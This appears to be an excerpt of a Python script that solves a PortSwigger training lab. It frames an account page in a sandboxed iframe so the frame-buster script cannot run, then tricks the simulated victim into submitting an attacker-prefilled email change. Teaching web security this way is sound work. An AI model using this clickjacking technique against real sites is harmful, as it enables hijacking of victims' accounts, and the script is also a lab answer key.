...
Companion script for the writeup: 03-clickjacking-with-a-frame-buster-script.md

What this does:
    Frames /my-account (which ships a `if (top !== self) top.location = self.location`
    frame buster) inside an iframe with `sandbox="allow-forms"`. The HTML5 sandbox
    attribute with no other tokens disables all scripting inside the frame -- including
    the buster's own <script> tag -- while `allow-forms` keeps form submission on a
    real user click working. Combined with the same email-prefill URL trick as the
    previous lab, the victim's click submits "Update email" with the attacker's address
    already loaded, and the buster never gets a chance to run. Delivered through the
    lab's own exploit server to the simulated victim.

    The 485px/60px overlay offset was measured directly against the "Update email"
    button's getBoundingClientRect() at the same 500px iframe width used here (see the
    writeup). It's hardcoded rather than re-measured at runtime because PortSwigger's
    lab template renders this page identically across every lab instance -- only the
    subdomain changes, not the layout -- so the coordinates transfer as-is.

Usage:
    python 03-clickjacking-with-a-frame-buster-script.py <lab-url>
    e.g. python 03-clickjacking-with-a-frame-buster-script.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net
...
def build_exploit_html(prefilled_target_url: str) -> str:
    return (
        "<style>\n"
        ...
        f'<iframe sandbox="{SANDBOX_ATTRS}" src="{prefilled_target_url}"></iframe>'
    )
...
def solve(lab_url: str) -> None:
    ...
    has_buster = any(re.search(p, r.text, re.IGNORECASE) for p in FRAME_BUSTER_PATTERNS)
    print(f"[*] {target} -- X-Frame-Options: {r.headers.get('x-frame-options', '(not set)')}, "
          f"frame buster detected: {has_buster}")

    prefilled_target = f"{target}?email={ATTACKER_EMAIL}"
    html = build_exploit_html(prefilled_target)
    ...
    print(f"[*] Delivering exploit via {exploit_url} (sandbox=\"{SANDBOX_ATTRS}\" disables the buster) ...")
    ...
    if "Congratulations" in check.text:
        print(f"[+] Lab solved -- the frame buster never ran, and the victim's email was changed to {ATTACKER_EMAIL}.")
    else:
